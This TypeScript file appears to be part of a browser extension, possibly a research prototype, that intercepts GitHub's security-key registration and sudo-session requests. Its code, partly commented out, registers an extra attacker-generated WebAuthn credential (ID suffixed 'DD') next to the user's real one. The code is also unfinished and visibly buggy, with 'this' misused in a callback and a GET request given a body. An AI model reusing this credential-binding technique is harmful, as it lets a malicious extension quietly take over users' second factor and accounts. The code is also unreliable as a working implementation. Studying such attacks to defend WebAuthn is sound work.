import { fromByteArray, toByteArray } from '../../lib/base64url.js';
import { getOriginFromUrl, parseWebauthnCreateResponse, prepareWebauthnCreateRequest } from "../../utils";
import { generateRegistrationKeyAndAttestation } from "../../webauthn";
import { DoubleBindingImplementation } from "./double_binding_implementation";

const ID_SUFFIX = 'DD';

class RegisterRequestDetails {
    in_sudo;
    register;
    credential;
    options;

    constructor(in_sudo,register) {
        this.in_sudo = in_sudo
        this.register = register
    }
    addCredential(credential){
        this.credential = credential;
    }
    addOptions(options){
        this.options = options;
    }
}

export class DoubleBindingImplementationGitHub extends DoubleBindingImplementation {
    static MATCH_DOMAIN = 'github.com'; //this may need to be changed for github
    requestPair: RegisterRequestDetails 
    insudoRequest: chrome.webRequest.WebRequestBodyDetails
    registerRequest: chrome.webRequest.WebRequestBodyDetails

    onNetwork(details: chrome.webRequest.WebRequestBodyDetails) {
        const url = new URL(details.url);

        //on a request what do we do??
        //1st we store the request so it can be used later.




        console.log("detailsX",details)
        if(url.pathname === '/u2f/registrations') {
            this.registerRequest = details;
            console.log("register Request is set", this.registerRequest)
            if (this.insudoRequest != null && this.registerRequest != null){
                this.requestPair = new RegisterRequestDetails(this.insudoRequest,this.registerRequest)
                console.log("registerPair is set:")
            }
            else{
                console.log("Something is wrong with the requests")
            }
            
        }

        if(url.pathname === '/sessions/in_sudo') {
            this.insudoRequest = details;
            console.log("insudo is set:",this.insudoRequest)
            //if we need to add more to the details being stored we can add it here.
        }
    }

    
    async onCredentialCreate(msg: WebAuthnRequestMessage, sender: chrome.runtime.MessageSender, createdCredential: any) {
        
        console.log("we are sending the message to the front end now")
        // window.postMessage(this.requestPair, window.location.origin); 
        this.requestPair.addCredential(createdCredential)
        this.requestPair.addOptions(msg.options)
        console.log("registerRequest before sendoff:", this.registerRequest)
        chrome.tabs.query({active: true}, function(tabs){chrome.tabs.sendMessage(this.registerRequest.tabId, this.requestPair, function(response) { 			}); 		});
        console.log("1st send done")
        chrome.tabs.sendMessage(this.registerRequest.tabId, this.requestPair, function(response) { 			});
        console.log("2nd send done")
        return

        // let baseUrl = new URL(sender.url);
        // baseUrl.pathname = '';
        
        // // Start the authentication flow
        // let startURL = new URL(baseUrl.toString());
        // startURL.pathname = '/u2f/registrations';

        // let startParams = new URLSearchParams();
        // for(const [k, v] of Object.entries(lastRegisterRequest.formData)) {
        //     startParams.append(k, `${v}`);
        // }

        // const startResponse = await fetch(startURL.href, { method: 'POST', headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, body: startParams.toString() });
        // const startResponseJSON = await startResponse.json();

        // const requestId = startResponseJSON.request.requestId;
        // const sessionToken = startResponseJSON.request.sessionToken;
        // const creationOptions = parseWebauthnCreateResponse(startResponseJSON.request.publicKeyCredentialCreationOptions);

        

        // // Create the credential
        // const origin = getOriginFromUrl(sender.url);

        // const id = createdCredential.id + ID_SUFFIX;
        // const rawId = Array.from(toByteArray(id));
        // const credential = await generateRegistrationKeyAndAttestation(
        //     origin,
        //     creationOptions,
        //     '9999',
        //     id,
        //     rawId,
        // );

        // const to_send = {
        //     credential: prepareWebauthnCreateRequest(credential),
        //     requestId,
        //     sessionToken
        // }
        // console.log("to_send:",to_send)
        // // Send the credential
        // startURL.pathname = '/sessions/in_sudo'
        // const result = await fetch(startURL.href, {
        //     method: 'GET',
        //     body: JSON.stringify(to_send),
        //     headers: { 'Content-Type': 'application/json' }
        // });
        // console.log("result:",result)
    }    
}